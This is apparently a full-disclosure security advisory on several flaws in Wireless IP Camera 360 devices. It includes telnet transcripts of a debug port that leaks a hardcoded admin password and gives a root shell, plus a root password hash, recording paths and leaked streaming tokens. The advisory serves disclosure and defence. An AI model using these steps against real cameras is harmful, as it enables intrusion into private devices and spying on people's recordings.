# IT Security Research WirelessIP camera family
New vulnerabilities have been found in the latest version of a family of Chinee IP-Cameras.

TL;DR New vulnerabilities have been found in the latest version of a family of Chinesse IP-Cameras. These vulerabilities allows root access as well as access to their recordings to anyone on the same network. This family of cameras were previously researched by PierreKimFirst, who published 7 vulnerabilities for some 1200+ cameras [[1]](https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html).

<p align=center> <img src="https://github.com/eloygn/IT_Security_Research_WirelessIP_camera_family/blob/master/images/WifiIPCamera360.jpg" width="300"> </p>

## Product description
The Wireless IP Camera 360 is a camera made in China that allows video and audio streaming via a propietrary app, and also corporates an alert system. It is a relative popular system: <a href="https://www.shodan.io/search?query=GoAhead+5ccc069c403ebaf9f0171e9517f40e41">Shodan</a> currently lists almost 200.000 vulnerable cameras connected to the Internet. Our recomendation to avoid its use until these vulnerabilies are solved.

The camera uses a similar hardware configuration than other Chinese IP Cameras models: Chipset GM8136+3035 with an embedded ARM processor and Wireless. The software available in this camera is composed by a customized Linux build around busybox and custom binaries. E.g. this is the content of /bin:

```php
addgroup adduser ash awk base64 basename beep cat chattr chgrp chmod chown chvt clear cmp cp cttyhack cut date dd
delgroup deluser df diff dirname dmesg dnsdomainname du echo egrep eject env ether-wake expr false fgconsole fgrep find
flock fold free fsyn ftpget ftpput fuser getopt grep groups head hexdump hostname id ifplugd install ionice iostat ip
ipaddr ipcrm  ipcs iplink iproute kill killall killall5 last less linuxrc ln logger login ls lsattr lspci lsusb mesg mkdir
mkfifo mknod mktemp more mount mountpoint mpstat mv nc netstat nice passwd ping pmap powertop printf ps pscan pstree pwd
pwdx readahead renice reset rev rm sed setserial sh sleep smemcap sort stat strings stty su sync tail tcpsvd tee telnet
tftp tftpd time timeout top touch tr traceroute true tty umount uname unexpand unxz uptime users usleep vi volname wall 
watch wc wget which who whoami whois xargs xz xzcat yes
```

A camera port scanning via WIFI reveales some ports that are listening for connections:

```php
PORT      STATE SERVICE
23/tcp    open  telnet
80/tcp    open  http
9527/tcp  open  unknown
22334/tcp open  unknown
34567/tcp open  unknown
```

## Vulnerabilities Summary
 1. RCE via wifi
 2. Full access to file recordings
 3. Telnet connectivity and backdoor account
 4. Streaming
 5. "Cloud" (Aka Botnet)

The vulnerabilities in the Cloud management affect a lot of P2P or "Cloud" cameras.

### Details - RCE via wifi 
Port 9527 is used for remote debugging. When that port is accessed via telnet, the camera shows multiple debug information:

```php
        user@kali$ telnet 192.168.3.4 9527
        Trying 192.168.3.4...
        Connected to 192.168.3.4.
        Escape character is '^]'.

        login: admin
        Password:
        login(admin, ******, Console, address:)

        __________________________password  = nTBCS19C
        admin$
        Connection closed.
        user@kali$
```

Once the information is transfered, the port shows a prompt, awaiting for login credentials. The credentials are part of the debug information previously transfered and cannot be changed by the user. In this case, the login is admin, and the password is 123456, i.e hash(123456) = nTBCS19C

The command help shows the following commands:
```php
             ability Net Ability Utility!
                  ad AD debug interface!
               alarm Alarm status!
            autoshut auto shut the DVR
             bitrate Dump BitRate infomation!
                 cfg Config Help Utility!
              encode Encode commands!
                  fs Fs debug interface!
                heap Dump heap status!
                help Try help!
                 log Log utility!
              netitf NetInterFace Dump!
                netm NetManager Dump!
              packet Packet usage!
                quit Quit!
              reboot Reboot the system!
              record Record console utility!
            resource CPU usage!
               shell Linux shell prompt!
            shutdown Shutdown the system!
                snap Snap Console Utility!
              thread Dump application threads!
                time Set SystemTime!
               timer Dump application timers!
             upgrade Upgrade utility!
                user Account Information!
                 ver version info!
```

That includes "shell Linux shell prompt!" which is a full root shell.

### Details - Full access to file recordings
All data in the SD memory card of the camera is stored at /mnt/idea0 and /mnt/idea1 in different files using JPEG and H264 (MPEG-4) formats, then it is possible to access to all the files of recordings.

This is the content of /mnt/idea0/:
```php
/mnt/idea0/2000-01-01/001/00.00.44-00.05.55[R][@40][0].h264,       16064 KB
/mnt/idea0/2017-06-24/001/06.18.50-06.22.25[R][@48][0].h264,       13120 KB
/mnt/idea0/2017-06-23/001/22.22.26-00.01.00[R][@4f][0].h264,       259757 KB
/mnt/idea0/2017-06-24/001/00.01.00-01.31.00[R][@ce][0].h264,       786940 KB
...
```

### Details - Telnet connectivity and backdoor account
Port 23 is constantly listening for telnet connections. There is at least one valid user on the system, with an improved salted SHA-512 password instead of MD5 hashes that were previously used in these similar IP cameras (Sofia vs Alloca software versions for the camera):
```php
root:$6$msTRRedr$e7Fw3JVflNlRZrIbR1f0qlKLpDnbvd40uyEJEKBIYs04vylb9IrSKU04Ldg56tdR1Qk5YPUeV/8PjFLiUFRVM1
```

### Details - Streaming without authentication
The previously refered port 9527 also leaks the RTSP credentials. An attacker could use the RTSP service running on the camera on the port 22334/TCP to watch the streaming using those autentification tokens:

```php
user@kali$ telnet 192.168.3.4 9527
Trying 192.168.3.4...
Connected to 192.168.3.4.
Escape character is '^]'.

Transport: New Client ID[0]@[192.168.3.4:49465] Connect___!!!___
==============>> [ConnectCallback] : 470,ConnectCallback,../../Net/NetIPStream/NetClientManage.cpp,m_bLANConnect = [1]
************************************
InsertConnect :  69f738
************************************
```

Although this token changes for each RTSP requests, it is easy to automate its capture.

### Details - Misc "Cloud" (aka Botnet)
By default, the camera uses a 'Cloud' functionality and it is constantly transmiting data to some external servers. The protocols used do not provide any protection against Man-in-the-middle attacks. Work in progress.

## Vendor Response
Due to difficulties in finding and contacting all the vendors, full-disclosure is applied.

## Credits
These vulnerabilities were found by EloyGN. Thanks to Dr. Ribalda for all his help.

## References
<p> [1] <a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html">Multiple vulnerabilities found in Wireless IP Camera by Pierre Kim.</a> </p>

## Disclaimer
This advisory is licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a>
